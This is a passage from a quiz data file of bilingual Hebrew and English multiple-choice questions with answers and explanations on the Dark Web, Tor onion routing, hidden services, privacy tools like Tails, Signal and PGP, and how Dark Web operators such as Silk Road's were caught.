      explanationEn: "In REST: GET /users/42 → unique URL → simple caching (HTTP caching).\n\nMain Points:\n- In GraphQL: POST /graphql with different query body each time → needs smart client-level caching (Apollo, Relay)",
      qEn: "What is the difference between REST and GraphQL regarding caching?",
      correctEn: "REST — easy caching because each endpoint is a unique URL\nGraphQL — complex caching because all requests go to one endpoint (/graphql)",
      choicesEn: [
        "REST — easy caching because each endpoint is a unique URL\nGraphQL — complex caching because all requests go to one endpoint (/graphql)",
        "GraphQL has better caching",
        "Neither supports caching",
        "REST doesn't support caching"
      ]
    }
  ],

  // ===== DARK WEB (801-805) =====

  801: [
    {
      q: "\u200Fמה ההבדל בין Deep Web ל־Dark Web?",
      correct: "\u200FDeep Web — תוכן שמנועי חיפוש לא מאנדקסים (90-95% מהאינטרנט)\nDark Web — תת-קבוצה קטנה שדורשת תוכנות מיוחדות כמו Tor",
      choices: [
        "\u200FDeep Web — תוכן שמנועי חיפוש לא מאנדקסים (90-95% מהאינטרנט)\nDark Web — תת-קבוצה קטנה שדורשת תוכנות מיוחדות כמו Tor",
        "\u200Fשניהם אותו דבר בדיוק",
        "\u200FDark Web הוא 90% מהאינטרנט",
        "\u200FDeep Web דורש Tor ו־Dark Web לא"
      ],
      explanation: "‏Deep Web כולל מיילים, חשבונות בנק, מסדי נתונים — תוכן לגיטימי שדורש הרשאה.\n\nעיקרי:\n- Dark Web הוא חלק זעיר שדורש תוכנות מיוחדות ומספק אנונימיות",
      explanationEn: "Deep Web includes emails, bank accounts, databases — legitimate content requiring authorization.\n\nMain Points:\n- Dark Web is a tiny subset requiring special software and providing anonymity",
      qEn: "What is the difference between Deep Web and Dark Web?",
      correctEn: "Deep Web — content not indexed by search engines (90-95% of the internet)\nDark Web — a small subset requiring special software like Tor",
      choicesEn: [
        "Deep Web — content not indexed by search engines (90-95% of the internet)\nDark Web — a small subset requiring special software like Tor",
        "They are exactly the same thing",
        "Dark Web is 90% of the internet",
        "Deep Web requires Tor and Dark Web does not"
      ]
    },
    {
      q: "\u200Fכמה אחוז מהאינטרנט מהווה ה־Surface Web?",
      correct: "\u200Fכ־5-10% בלבד — רק מה שמנועי חיפוש כמו Google מאנדקסים",
      choices: [
        "\u200Fכ־5-10% בלבד — רק מה שמנועי חיפוש כמו Google מאנדקסים",
        "\u200Fכ־90% מהאינטרנט",
        "\u200Fכ־50% מהאינטרנט",
        "\u200Fכ־1% בלבד"
      ],
      explanation: "‏למרות שגוגל מאנדקס מיליארדי דפים, זה רק 5-10% מכלל התוכן.\n\nעיקרי:\n- רוב האינטרנט (90-95%) הוא Deep Web — תוכן מוגן בסיסמאות או לא נגיש לסורקים",
      explanationEn: "Even though Google indexes billions of pages, that's only 5-10% of all content.\n\nMain Points:\n- Most of the internet (90-95%) is Deep Web — content protected by passwords or inaccessible to crawlers",
      qEn: "What percentage of the internet does the Surface Web constitute?",
      correctEn: "Only about 5-10% — only what search engines like Google can index",
      choicesEn: [
        "Only about 5-10% — only what search engines like Google can index",
        "About 90% of the internet",
        "About 50% of the internet",
        "Only about 1%"
      ]
    },
    {
      q: "\u200Fאיזה סיומת כתובת משמשת אתרים ב־Dark Web?",
      correct: "\u200F.onion — כתובות ייחודיות שנגישות רק דרך דפדפן Tor",
      choices: [
        "\u200F.onion — כתובות ייחודיות שנגישות רק דרך דפדפן Tor",
        "\u200F.dark — כתובות מוצפנות",
        "\u200F.deep — כתובות מוסתרות",
        "\u200F.tor — כתובות אנונימיות"
      ],
      explanation: "‏אתרים ב־Dark Web משתמשים בכתובות .onion שנגזרות ממפתח הצפנה ציבורי.\n\nעיקרי:\n- הן נגישות רק דרך דפדפן Tor ומספקות אנונימיות דו-כיוונית",
      explanationEn: "Dark Web sites use .onion addresses derived from a public encryption key.\n\nMain Points:\n- They are accessible only through the Tor browser and provide two-way anonymity",
      qEn: "What address extension is used by Dark Web sites?",
      correctEn: ".onion — unique addresses accessible only through the Tor browser",
      choicesEn: [
        ".onion — unique addresses accessible only through the Tor browser",
        ".dark — encrypted addresses",
        ".deep — hidden addresses",
        ".tor — anonymous addresses"
      ]
    },
    {
      q: "\u200Fמה מתוך הבאים הוא דוגמה ל־Deep Web ולא ל־Dark Web?",
      correct: "\u200Fתיבת המייל שלכם וחשבון הבנק — תוכן לגיטימי שדורש הרשאה",
      choices: [
        "\u200Fתיבת המייל שלכם וחשבון הבנק — תוכן לגיטימי שדורש הרשאה",
        "\u200Fאתר עם כתובת .onion",
        "\u200Fאתר חדשות כמו CNN",
        "\u200Fפורום אנונימי שנגיש רק דרך Tor"
      ],
      explanation: "‏תיבת מייל וחשבון בנק הם Deep Web — תוכן שמנועי חיפוש לא יכולים לגשת אליו כי הוא מוגן בסיסמה, אבל לא צריך תוכנות מיוחדות.\n\nעיקרי:\n- CNN הוא Surface Web",
      explanationEn: "Email and bank accounts are Deep Web — content that search engines can't access because it's password-protected, but doesn't require special software.\n\nMain Points:\n- CNN is Surface Web",
      qEn: "Which of the following is an example of Deep Web and not Dark Web?",
      correctEn: "Your email inbox and bank account — legitimate content requiring authorization",
      choicesEn: [
        "Your email inbox and bank account — legitimate content requiring authorization",
        "A site with a .onion address",
        "A news site like CNN",
        "An anonymous forum accessible only through Tor"
      ]
    },
    {
      q: "\u200Fהאם כל הפעילות ב־Dark Web היא לא חוקית?",
      correct: "\u200Fלא — יש שימושים לגיטימיים רבים כמו עיתונאות, פעילות זכויות אדם ושמירה על פרטיות",
      choices: [
        "\u200Fלא — יש שימושים לגיטימיים רבים כמו עיתונאות, פעילות זכויות אדם ושמירה על פרטיות",
        "\u200Fכן — כל פעילות ב־Dark Web אסורה בחוק",
        "\u200Fכן — זו רשת של פושעים בלבד",
        "\u200Fלא — אבל רק ממשלות משתמשות בה לגיטימית"
      ],
      explanation: "‏ארגונים כמו BBC ו־Facebook מפעילים אתרי .onion.\n\nעיקרי:\n- עיתונאים משתמשים ב־SecureDrop, ופעילי זכויות אדם משתמשים ב־Tor כדי לגשת למידע במדינות עם צנזורה",
      explanationEn: "Organizations like BBC and Facebook operate .onion sites.\n\nMain Points:\n- Journalists use SecureDrop, and human rights activists use Tor to access information in countries with censorship",
      qEn: "Is all activity on the Dark Web illegal?",
      correctEn: "No — there are many legitimate uses like journalism, human rights activism, and privacy protection",
      choicesEn: [
        "No — there are many legitimate uses like journalism, human rights activism, and privacy protection",
        "Yes — all Dark Web activity is illegal",
        "Yes — it's a network only for criminals",
        "No — but only governments use it legitimately"
      ]
    }
  ],

  802: [
    {
      q: "\u200Fדרך כמה nodes (שרתים) עוברת תעבורה ברשת Tor?",
      correct: "\u200F3 nodes — Guard (כניסה), Middle (ממסר), ו־Exit (יציאה)",
      choices: [
        "\u200F3 nodes — Guard (כניסה), Middle (ממסר), ו־Exit (יציאה)",
        "\u200F2 nodes — כניסה ויציאה",
        "\u200F5 nodes לאבטחה מקסימלית",
        "\u200Fnode אחד מוצפן"
      ],
      explanation: "‏Tor מנתב תעבורה דרך שלושה nodes: Guard יודע מי אתם אבל לא לאן, Middle לא יודע כלום, Exit יודע לאן אבל לא מי.\n\nעיקרי:\n- כך אף node לא מחזיק את כל המידע",
      explanationEn: "Tor routes traffic through three nodes: Guard knows who you are but not where you're going, Middle knows nothing, Exit knows where but not who.\n\nMain Points:\n- No single node has the full picture",
      qEn: "Through how many nodes does Tor traffic pass?",
      correctEn: "3 nodes — Guard (entry), Middle (relay), and Exit",
      choicesEn: [
        "3 nodes — Guard (entry), Middle (relay), and Exit",
        "2 nodes — entry and exit",
        "5 nodes for maximum security",
        "A single encrypted node"
      ]
    },
    {
      q: "\u200Fלמה ההצפנה ב־Tor נקראת Onion Routing?",
      correct: "\u200Fכי ההודעה מוצפנת בשכבות כמו בצל — כל node מקלף שכבה אחת",
      choices: [
        "\u200Fכי ההודעה מוצפנת בשכבות כמו בצל — כל node מקלף שכבה אחת",
        "\u200Fכי הלוגו של Tor הוא בצל",
        "\u200Fכי האלגוריתם נקרא ONION",
        "\u200Fכי השרתים מסודרים בצורת בצל"
      ],
      explanation: "‏לפני השליחה, ההודעה מוצפנת 3 פעמים (שכבה לכל node).\n\nעיקרי:\n- כל node מקלף שכבת הצפנה אחת ורואה רק לאן לשלוח הלאה — בדיוק כמו קילוף שכבות של בצל",
      explanationEn: "Before sending, the message is encrypted 3 times (one layer per node).\n\nMain Points:\n- Each node peels off one encryption layer and sees only where to forward next — just like peeling onion layers",
      qEn: "Why is Tor's encryption called Onion Routing?",
      correctEn: "Because the message is encrypted in layers like an onion — each node peels off one layer",
      choicesEn: [
        "Because the message is encrypted in layers like an onion — each node peels off one layer",
        "Because Tor's logo is an onion",
        "Because the algorithm is called ONION",
        "Because the servers are arranged in an onion shape"
      ]
    },
    {
      q: "\u200Fמה יודע ה־Guard Node על המשתמש?",
      correct: "\u200Fיודע את ה־IP של המשתמש אבל לא יודע לאיזה אתר הוא גולש",
      choices: [
        "\u200Fיודע את ה־IP של המשתמש אבל לא יודע לאיזה אתר הוא גולש",
        "\u200Fיודע הכל — גם מי וגם לאן",
        "\u200Fלא יודע כלום על המשתמש",
        "\u200Fיודע לאיזה אתר גולשים אבל לא את ה־IP"
      ],
      explanation: "‏ה־Guard Node הוא התחנה הראשונה.\n\nעיקרי:\n- הוא רואה את ה־IP האמיתי של המשתמש, אבל ההודעה עדיין עטופה בשתי שכבות הצפנה — אז הוא לא יודע מה היעד הסופי",
      explanationEn: "The Guard Node is the first stop.\n\nMain Points:\n- It sees the user's real IP, but the message is still wrapped in two encryption layers — so it doesn't know the final destination",
      qEn: "What does the Guard Node know about the user?",
      correctEn: "Knows the user's IP but not which website they are browsing",
      choicesEn: [
        "Knows the user's IP but not which website they are browsing",
        "Knows everything — both who and where",
        "Knows nothing about the user",
        "Knows which website but not the IP"
      ]
    },
    {
      q: "\u200Fמהי מתקפת Timing ב־Tor ומתי היא אפשרית?",
      correct: "\u200Fכשתוקף שולט גם ב־Guard וגם ב־Exit — הוא יכול לקשר בין תזמון ונפח תעבורה ולחשוף את המשתמש",
      choices: [
        "\u200Fכשתוקף שולט גם ב־Guard וגם ב־Exit — הוא יכול לקשר בין תזמון ונפח תעבורה ולחשוף את המשתמש",
        "\u200Fמספיק לשלוט ב-node אחד כדי לפרוץ",
        "\u200Fמתקפה שמאטה את הרשת עד שהיא קורסת",
        "\u200Fמתקפה שפורצת את ההצפנה ישירות"
      ],
      explanation: "‏אם תוקף שולט ב־Guard (רואה מי) וב־Exit (רואה לאן), הוא יכול להשוות תזמון ונפח תעבורה בשני הקצוות ולקשר ביניהם.\n\nעיקרי:\n- לכן Tor שומר Guard קבוע — כדי להקטין סיכוי לפגוש Guard זדוני",
      explanationEn: "If an attacker controls both Guard (sees who) and Exit (sees where), they can correlate timing and traffic volume at both ends.\n\nMain Points:\n- That's why Tor keeps a persistent Guard — to reduce the chance of hitting a malicious one",
      qEn: "What is a Timing attack in Tor and when is it possible?",
      correctEn: "When an attacker controls both Guard and Exit — they can correlate timing and traffic volume to identify the user",
      choicesEn: [
        "When an attacker controls both Guard and Exit — they can correlate timing and traffic volume to identify the user",
        "Controlling one node is enough to break in",
        "An attack that slows the network until it crashes",
        "An attack that directly breaks the encryption"
      ]
    },
    {
      q: "\u200Fמה תפקידם של ה־Directory Authorities ב־Tor?",
      correct: "\u200F10 שרתים מהימנים שמנהלים את רשימת כל ה-nodes ומפרסמים קונצנזוס עם דגלים ורוחב פס",
      choices: [
        "\u200F10 שרתים מהימנים שמנהלים את רשימת כל ה-nodes ומפרסמים קונצנזוס עם דגלים ורוחב פס",
        "\u200Fשרתים שמצפינים את התעבורה",
        "\u200Fשרתים שמאחסנים את כל ההודעות",
        "\u200Fשרתים שמנתבים את התעבורה במקום ה-nodes"
      ],
      explanation: "‏ה־Directory Authorities הם 10 שרתים מהימנים שמצביעים על 'קונצנזוס' — רשימה מאושרת של nodes עם דגלים (Guard, Exit, Stable) ורוחב פס.\n\nעיקרי:\n- דפדפן Tor מוריד את הרשימה ובוחר nodes ממנה",
      explanationEn: "Directory Authorities are 10 trusted servers that vote on a 'consensus' — an approved list of nodes with flags (Guard, Exit, Stable) and bandwidth.\n\nMain Points:\n- The Tor browser downloads this list and selects nodes from it",
      qEn: "What is the role of Directory Authorities in Tor?",
      correctEn: "10 trusted servers that manage the list of all nodes and publish a consensus with flags and bandwidth",
      choicesEn: [
        "10 trusted servers that manage the list of all nodes and publish a consensus with flags and bandwidth",
        "Servers that encrypt the traffic",
        "Servers that store all messages",
        "Servers that route traffic instead of nodes"
      ]
    }
  ],

  803: [
    {
      q: "\u200Fמה ההבדל בין גלישה רגילה דרך Tor לבין גישה ל־Hidden Service?",
      correct: "\u200Fבגלישה רגילה התעבורה יוצאת דרך Exit Node לאינטרנט הפתוח\nב־Hidden Service כל התעבורה נשארת בתוך רשת Tor",
      choices: [
        "\u200Fבגלישה רגילה התעבורה יוצאת דרך Exit Node לאינטרנט הפתוח\nב־Hidden Service כל התעבורה נשארת בתוך רשת Tor",
        "\u200Fאין הבדל — שניהם עובדים אותו דבר",
        "\u200FHidden Service מהיר יותר",
        "\u200FHidden Service לא משתמש בהצפנה"
      ],
      explanation: "‏בגלישה רגילה דרך Tor, רק המשתמש אנונימי — התעבורה יוצאת דרך Exit Node.\n\nעיקרי:\n- ב־Hidden Service, גם המשתמש וגם השרת אנונימיים, אין Exit Node, וההצפנה היא מקצה לקצה",
      explanationEn: "In regular Tor browsing, only the user is anonymous — traffic exits through an Exit Node.\n\nMain Points:\n- With Hidden Services, both user and server are anonymous, there's no Exit Node, and encryption is end-to-end",
      qEn: "What is the difference between regular Tor browsing and accessing a Hidden Service?",
      correctEn: "In regular browsing, traffic exits through an Exit Node to the open internet\nWith Hidden Services, all traffic stays within the Tor network",
      choicesEn: [
        "In regular browsing, traffic exits through an Exit Node to the open internet\nWith Hidden Services, all traffic stays within the Tor network",
        "No difference — both work the same way",
        "Hidden Service is faster",
        "Hidden Service doesn't use encryption"
      ]
    },
    {
      q: "\u200Fמה תפקידו של ה־Rendezvous Point בחיבור ל־Hidden Service?",
      correct: "\u200Fנקודת מפגש שמחברת את מעגל ה־Tor של המשתמש למעגל של השרת — בלי שאף צד יודע מי השני",
      choices: [
        "\u200Fנקודת מפגש שמחברת את מעגל ה־Tor של המשתמש למעגל של השרת — בלי שאף צד יודע מי השני",
        "\u200Fשרת שמאחסן את תוכן האתר",
        "\u200Fשרת שמפענח את ההצפנה",
        "\u200Fשרת שמאמת את זהות המשתמש"
      ],
      explanation: "‏ה־Rendezvous Point הוא node ניטרלי.\n\nעיקרי:\n- המשתמש בונה מעגל Tor אליו (3 nodes), השרת בונה מעגל נפרד אליו (3 nodes), וה־RP מחבר ביניהם — סה\"כ 6 nodes\n- הוא רואה רק תעבורה מוצפנת",
      explanationEn: "The Rendezvous Point is a neutral node.\n\nMain Points:\n- The user builds a Tor circuit to it (3 nodes), the server builds a separate circuit to it (3 nodes), and the RP connects them — 6 nodes total\n- It only sees encrypted traffic",
      qEn: "What is the role of the Rendezvous Point in connecting to a Hidden Service?",
      correctEn: "A meeting point that connects the user's Tor circuit to the server's circuit — without either side knowing who the other is",
      choicesEn: [
        "A meeting point that connects the user's Tor circuit to the server's circuit — without either side knowing who the other is",
        "A server that stores the site's content",
        "A server that decrypts the encryption",
        "A server that verifies the user's identity"
      ]
    },
    {
      q: "\u200Fאיך כתובת .onion נוצרת?",
      correct: "\u200Fנגזרת מהמפתח הציבורי של השרת — בגרסה v3 היא בת 56 תווים עם הצפנת ed25519",
      choices: [
        "\u200Fנגזרת מהמפתח הציבורי של השרת — בגרסה v3 היא בת 56 תווים עם הצפנת ed25519",
        "\u200Fנבחרת אקראית על ידי Tor",
        "\u200Fנרשמת כמו דומיין רגיל",
        "\u200Fמוגדרת ידנית על ידי מפעיל האתר"
      ],
      explanation: "‏כתובת .onion נגזרת ממפתח ההצפנה הציבורי של השרת.\n\nעיקרי:\n- זה אומר שהכתובת עצמה היא הוכחת זהות — מי שמגיע לכתובת הנכונה בהכרח מתחבר לשרת הנכון",
      explanationEn: "The .onion address is derived from the server's public encryption key.\n\nMain Points:\n- This means the address itself is proof of identity — reaching the correct address guarantees connecting to the correct server",
      qEn: "How is a .onion address created?",
      correctEn: "Derived from the server's public key — in v3 it's 56 characters long using ed25519 encryption",
      choicesEn: [
        "Derived from the server's public key — in v3 it's 56 characters long using ed25519 encryption",
        "Randomly chosen by Tor",
        "Registered like a regular domain",
        "Manually set by the site operator"
      ]
    },
    {
      q: "\u200Fמה תפקידם של Introduction Points בתהליך חיבור ל־Hidden Service?",
      correct: "\u200Fנקודות קבועות שהשרת מחזיק חיבור אליהן — דרכן המשתמש שולח בקשה ראשונית להתחבר",
      choices: [
        "\u200Fנקודות קבועות שהשרת מחזיק חיבור אליהן — דרכן המשתמש שולח בקשה ראשונית להתחבר",
        "\u200Fנקודות שמאחסנות את תוכן האתר",
        "\u200Fנקודות שמבצעות את ההצפנה",
        "\u200Fנקודות שמאמתות סיסמאות"
      ],
      explanation: "‏השרת בוחר Introduction Points ושומר עליהם חיבור קבוע דרך מעגלי Tor.\n\nעיקרי:\n- כשמשתמש רוצה להתחבר, הוא שולח הודעה דרך ה־IP ומציע Rendezvous Point\n- רשימת ה־IPs מפורסמת ב־DHT",
      explanationEn: "The server selects Introduction Points and maintains a persistent connection to them through Tor circuits.\n\nMain Points:\n- When a user wants to connect, they send a message through the IP proposing a Rendezvous Point\n- The IP list is published in the DHT",
      qEn: "What is the role of Introduction Points in connecting to a Hidden Service?",
      correctEn: "Persistent points the server maintains connections to — through which users send initial connection requests",
      choicesEn: [
        "Persistent points the server maintains connections to — through which users send initial connection requests",
        "Points that store the site's content",
        "Points that perform the encryption",
        "Points that verify passwords"
      ]
    },
    {
      q: "\u200Fמה הוא SecureDrop ומי משתמש בו?",
      correct: "\u200Fפלטפורמה שרצה כ־Hidden Service ומאפשרת למקורות לשלוח מסמכים לעיתונאים באנונימיות",
      choices: [
        "\u200Fפלטפורמה שרצה כ־Hidden Service ומאפשרת למקורות לשלוח מסמכים לעיתונאים באנונימיות",
        "\u200Fתוכנת אנטי-וירוס ל־Dark Web",
        "\u200Fשירות אחסון ענן מוצפן",
        "\u200Fמנוע חיפוש ל־Dark Web"
      ],
      explanation: "‏SecureDrop היא פלטפורמה של Freedom of the Press Foundation.\n\nעיקרי:\n- היא משמשת יותר מ־70 ארגוני חדשות (The Guardian, NYT, Washington Post) ומאפשרת למקורות לחשוף שחיתות בלי לסכן את חייהם",
      explanationEn: "SecureDrop is a platform by the Freedom of the Press Foundation.\n\nMain Points:\n- It's used by over 70 news organizations (The Guardian, NYT, Washington Post) allowing sources to expose corruption without risking their lives",
      qEn: "What is SecureDrop and who uses it?",
      correctEn: "A platform running as a Hidden Service that allows sources to send documents to journalists anonymously",
      choicesEn: [
        "A platform running as a Hidden Service that allows sources to send documents to journalists anonymously",
        "An antivirus for the Dark Web",
        "An encrypted cloud storage service",
        "A search engine for the Dark Web"
      ]
    }
  ],

  804: [
    {
      q: "\u200Fמה החולשה המרכזית של VPN בהשוואה ל־Tor?",
      correct: "\u200Fספק ה־VPN רואה את כל התעבורה שלכם — אתם חייבים לסמוך עליו לחלוטין",
      choices: [
        "\u200Fספק ה־VPN רואה את כל התעבורה שלכם — אתם חייבים לסמוך עליו לחלוטין",
        "\u200FVPN לא מצפין בכלל",
        "\u200FVPN איטי יותר מ־Tor",
        "\u200FVPN לא מסתיר את ה־IP"
      ],
      explanation: "‏VPN מנתב את כל התעבורה דרך שרת אחד של הספק — הספק רואה הכל.\n\nעיקרי:\n- ב־Tor, שלושה nodes אקראיים מתחלקים במידע ואף אחד לא רואה את כל התמונה\n- VPN מהיר יותר אבל דורש אמון",
      explanationEn: "VPN routes all traffic through one provider server — the provider sees everything.\n\nMain Points:\n- In Tor, three random nodes share the information and none sees the full picture\n- VPN is faster but requires trust",
      qEn: "What is the main weakness of VPN compared to Tor?",
      correctEn: "The VPN provider sees all your traffic — you must trust them completely",
      choicesEn: [
        "The VPN provider sees all your traffic — you must trust them completely",
        "VPN doesn't encrypt at all",
        "VPN is slower than Tor",
        "VPN doesn't hide your IP"
      ]
    },
    {
      q: "\u200Fמה מיוחד ב־Tails OS מבחינת אבטחה?",
      correct: "\u200Fרצה מ־USB, מנתבת הכל דרך Tor, ומוחקת הכל בכיבוי — לא נשארים עקבות",
      choices: [
        "\u200Fרצה מ־USB, מנתבת הכל דרך Tor, ומוחקת הכל בכיבוי — לא נשארים עקבות",
        "\u200Fמערכת הפעלה רגילה עם אנטי-וירוס מובנה",
        "\u200Fמערכת שחוסמת אתרים מסוכנים",
        "\u200Fמערכת שמצפינה רק קבצים"
      ],
      explanation: "‏Tails (The Amnesic Incognito Live System) היא אמנזית — הכל נמחק בכיבוי.\n\nעיקרי:\n- כל התעבורה עוברת דרך Tor אוטומטית ואפליקציות לא יכולות לעקוף\n- היא לא נוגעת בדיסק הקשיח של המחשב",
      explanationEn: "Tails (The Amnesic Incognito Live System) is amnesic — everything is wiped on shutdown.\n\nMain Points:\n- All traffic goes through Tor automatically and applications cannot bypass it\n- It doesn't touch the computer's hard drive",
      qEn: "What makes Tails OS special in terms of security?",
      correctEn: "Runs from USB, routes everything through Tor, and erases everything on shutdown — no traces left",
      choicesEn: [
        "Runs from USB, routes everything through Tor, and erases everything on shutdown — no traces left",
        "A regular OS with built-in antivirus",
        "A system that blocks dangerous websites",
        "A system that only encrypts files"
      ]
    },
    {
      q: "\u200Fמהו Perfect Forward Secrecy ב־Signal?",
      correct: "\u200Fכל הודעה מוצפנת במפתח שונה — פריצת מפתח אחד לא חושפת הודעות אחרות",
      choices: [
        "\u200Fכל הודעה מוצפנת במפתח שונה — פריצת מפתח אחד לא חושפת הודעות אחרות",
        "\u200Fהודעות נמחקות אוטומטית אחרי קריאה",
        "\u200Fההצפנה מתחזקת עם הזמן",
        "\u200Fרק השולח יכול לקרוא את ההודעה"
      ],
      explanation: "‏Perfect Forward Secrecy אומר שכל הודעה מוצפנת במפתח ייחודי.\n\nעיקרי:\n- גם אם תוקף פורץ מפתח של הודעה אחת, כל שאר ההודעות (עבר ועתיד) נשארות מוגנות\n- זה שונה ממערכות עם מפתח אחד לכל השיחה",
      explanationEn: "Perfect Forward Secrecy means each message is encrypted with a unique key.\n\nMain Points:\n- Even if an attacker cracks one message's key, all other messages (past and future) remain protected\n- This differs from systems using one key for an entire conversation",
      qEn: "What is Perfect Forward Secrecy in Signal?",
      correctEn: "Each message is encrypted with a different key — cracking one key doesn't expose other messages",
      choicesEn: [
        "Each message is encrypted with a different key — cracking one key doesn't expose other messages",
        "Messages are automatically deleted after reading",
        "Encryption strengthens over time",
        "Only the sender can read the message"
      ]
    },
    {
      q: "\u200Fמהו Metadata ולמה הוא מסוכן גם כשהתוכן מוצפן?",
      correct: "\u200FMetadata הוא מידע על המידע (מי, מתי, למי, כמה זמן) — חושף דפוסים גם בלי לקרוא תוכן",
      choices: [
        "\u200FMetadata הוא מידע על המידע (מי, מתי, למי, כמה זמן) — חושף דפוסים גם בלי לקרוא תוכן",
        "\u200FMetadata הוא וירוס שמוסתר בקבצים",
        "\u200FMetadata הוא סוג של הצפנה חלשה",
        "\u200FMetadata הוא שם לתוכן שנמחק"
      ],
      explanation: "‏גם בלי לקרוא תוכן, Metadata חושף: מי דיבר עם מי, מתי, כמה זמן, מאיזה מיקום.\n\nעיקרי:\n- למשל, שיחות למרפאה + לרופא + לביטוח חושפות מצב רפואי\n- כלים כמו MAT2 מסירים metadata מקבצים",
      explanationEn: "Even without reading content, Metadata reveals: who talked to whom, when, for how long, from where.\n\nMain Points:\n- For example, calls to a clinic + doctor + insurance reveal medical condition\n- Tools like MAT2 remove metadata from files",
      qEn: "What is Metadata and why is it dangerous even when content is encrypted?",
      correctEn: "Metadata is information about information (who, when, to whom, how long) — reveals patterns without reading content",
      choicesEn: [
        "Metadata is information about information (who, when, to whom, how long) — reveals patterns without reading content",
        "Metadata is a virus hidden in files",
        "Metadata is a type of weak encryption",
        "Metadata is a name for deleted content"
      ]
    },
    {
      q: "\u200Fמה ההבדל בין PGP ל־Signal מבחינת שימוש?",
      correct: "\u200FSignal מוצפנת אוטומטית ופשוטה לשימוש\nPGP דורש הגדרה ידנית וניהול מפתחות אבל לא תלוי בשירות ספציפי",
      choices: [
        "\u200FSignal מוצפנת אוטומטית ופשוטה לשימוש\nPGP דורש הגדרה ידנית וניהול מפתחות אבל לא תלוי בשירות ספציפי",
        "\u200FPGP בטוח יותר מ־Signal",
        "\u200FSignal עובדת רק עם מיילים",
        "\u200Fאין הבדל — שניהם עובדים אותו דבר"
      ],
      explanation: "‏Signal מספקת הצפנה אוטומטית וקלה לשימוש אבל תלויה באפליקציה ובשרתים שלה.\n\nעיקרי:\n- PGP עובד עם מייל רגיל ולא תלוי בשירות מרכזי, אבל דורש ניהול מפתחות ידני — ציבורי לשיתוף ופרטי לפענוח",
      explanationEn: "Signal provides automatic encryption that's easy to use but depends on its app and servers.\n\nMain Points:\n- PGP works with regular email and doesn't depend on a central service, but requires manual key management — public for sharing and private for decryption",
      qEn: "What is the difference between PGP and Signal in terms of usage?",
      correctEn: "Signal is automatically encrypted and simple to use\nPGP requires manual setup and key management but doesn't depend on a specific service",
      choicesEn: [
        "Signal is automatically encrypted and simple to use\nPGP requires manual setup and key management but doesn't depend on a specific service",
        "PGP is more secure than Signal",
        "Signal only works with emails",
        "No difference — both work the same way"
      ]
    }
  ],

  805: [
    {
      q: "\u200Fהאם שימוש ב־Tor חוקי בישראל?",
      correct: "\u200Fכן, חוקי לחלוטין — אין חוק שאוסר הצפנה או אנונימיות ברשת. הפעולות שמבוצעות קובעות את החוקיות",
      choices: [
        "\u200Fכן, חוקי לחלוטין — אין חוק שאוסר הצפנה או אנונימיות ברשת. הפעולות שמבוצעות קובעות את החוקיות",
        "\u200Fלא, Tor אסור בישראל",
        "\u200Fחוקי רק לממשלה ולצבא",
        "\u200Fחוקי רק עם אישור מיוחד"
      ],
      explanation: "‏בישראל ובמרבית המדינות המערביות, Tor חוקי לחלוטין.\n\nעיקרי:\n- הכלי עצמו הוא ניטרלי — מה שקובע את החוקיות הוא מה עושים איתו\n- רכישת סמים אסורה עם או בלי Tor",
      explanationEn: "In Israel and most Western countries, Tor is completely legal.\n\nMain Points:\n- The tool itself is neutral — legality is determined by what you do with it\n- Buying drugs is illegal with or without Tor",
      qEn: "Is using Tor legal in Israel?",
      correctEn: "Yes, completely legal — there's no law prohibiting encryption or anonymity online. The actions performed determine legality",
      choicesEn: [
        "Yes, completely legal — there's no law prohibiting encryption or anonymity online. The actions performed determine legality",
        "No, Tor is banned in Israel",
        "Legal only for government and military",
        "Legal only with special permission"
      ]
    },
    {
      q: "\u200Fאיך נתפס מפעיל Silk Road (רוס אולבריכט)?",
      correct: "\u200Fטעויות אופרציוניות — פרסם עם שם אמיתי בפורום והזמין זהויות מזויפות לכתובת האמיתית שלו",
      choices: [
        "\u200Fטעויות אופרציוניות — פרסם עם שם אמיתי בפורום והזמין זהויות מזויפות לכתובת האמיתית שלו",
        "\u200Fפריצת הצפנת Tor",
        "\u200Fמעקב GPS",
        "\u200Fדליפת כתובת IP מהשרת"
      ],
      explanation: "‏רוב המעצרים ב־Dark Web נובעים מטעויות אנושיות, לא מפריצת Tor.\n\nעיקרי:\n- אולבריכט השתמש בשם אמיתי בפורום מוקדם, הזמין זהויות מזויפות לכתובתו, ועוד שגיאות שאפשרו ל־FBI לזהות אותו",
      explanationEn: "Most Dark Web arrests result from human errors, not breaking Tor.\n\nMain Points:\n- Ulbricht used his real name on an early forum, ordered fake IDs to his address, and other mistakes that let the FBI identify him",
      qEn: "How was the Silk Road operator (Ross Ulbricht) caught?",
      correctEn: "Operational mistakes — posted with his real name on a forum and ordered fake IDs to his real address",
      choicesEn: [
        "Operational mistakes — posted with his real name on a forum and ordered fake IDs to his real address",
        "Breaking Tor's encryption",
        "GPS tracking",
        "IP address leak from the server"
      ]
    },
    {
      q: "\u200Fלמה Bitcoin אינו באמת אנונימי?",
      correct: "\u200FBitcoin הוא פסאודונימי — כל העסקאות גלויות ב-blockchain וניתוח דפוסים יכול לחשוף זהויות",
      choices: [
        "\u200FBitcoin הוא פסאודונימי — כל העסקאות גלויות ב-blockchain וניתוח דפוסים יכול לחשוף זהויות",
        "\u200FBitcoin שומר את השם האמיתי של כל משתמש",
        "\u200FBitcoin דורש תעודת זהות לכל עסקה",
        "\u200FBitcoin לא מאפשר עסקאות כלל ב־Dark Web"
      ],
      explanation: "‏Bitcoin הוא פסאודונימי — כל עסקה נרשמת ב-blockchain ציבורי.\n\nעיקרי:\n- ניתוח blockchain חושף דפוסי עסקאות ומוביל לזיהוי\n- כך נתפסו מפעילי Welcome to Video (2019) — מעקב אחר עסקאות Bitcoin הוביל ל־337 מעצרים ב־23 מדינות",
      explanationEn: "Bitcoin is pseudonymous — every transaction is recorded on a public blockchain.\n\nMain Points:\n- Blockchain analysis reveals transaction patterns leading to identification\n- That's how Welcome to Video operators were caught (2019) — Bitcoin tracing led to 337 arrests in 23 countries",
      qEn: "Why isn't Bitcoin truly anonymous?",
      correctEn: "Bitcoin is pseudonymous — all transactions are visible on the blockchain and pattern analysis can reveal identities",
      choicesEn: [
        "Bitcoin is pseudonymous — all transactions are visible on the blockchain and pattern analysis can reveal identities",
        "Bitcoin stores every user's real name",
        "Bitcoin requires ID for every transaction",
        "Bitcoin doesn't allow Dark Web transactions at all"
      ]
    },
    {
      q: "\u200Fמהו מבצע Operation Bayonet ומה המיוחד בו?",
      correct: "\u200Fה־FBI סגר את AlphaBay והמשטרה ההולנדית השתלטה על Hansa בסתר — משתמשים שברחו ל־Hansa נתפסו",
      choices: [
